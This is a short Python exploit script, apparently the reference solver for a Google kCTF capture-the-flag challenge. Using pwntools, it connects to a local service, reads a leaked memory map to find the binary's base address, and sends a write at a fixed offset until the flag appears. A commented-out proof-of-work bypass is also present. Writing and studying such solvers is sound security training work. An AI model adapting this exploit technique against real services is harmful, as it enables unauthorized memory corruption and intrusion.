#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

# def handle_pow(r):
#     print(r.recvuntil(b'python3 '))
#     print(r.recvuntil(b' solve '))
#     challenge = r.recvline().decode('ascii').strip()
#     p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
#     solution = p.readall().strip()
#     r.sendline(solution)
#     print(r.recvuntil(b'Correct\n'))
def remote_write(r,address,length):
	#print("Writing",hex(address) + " " + str(length))
	r.send(hex(address) + " " + str(length))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

# print(r.recvuntil("I'll give you my mappings so that you'll have a shot.\n"))
output = r.recvuntil("expire\n",timeout=1)
print("Received",output)
binary_base = int(output.split(b"\n")[9].split(b'-')[0],16)

print("Binary base",hex(binary_base))
remote_write(r,binary_base + 0x21e0, 126)
output = r.recvuntil("CTF{",timeout=1)
if(output.find(b"CTF{") == -1):
	exit(1)
# print(r.recvuntil('== proof-of-work: '))
# if r.recvline().startswith(b'enabled'):
#     handle_pow(r)

# print(r.recvuntil(b'CTF{'))
# print(r.recvuntil(b'}'))

# exit(0)
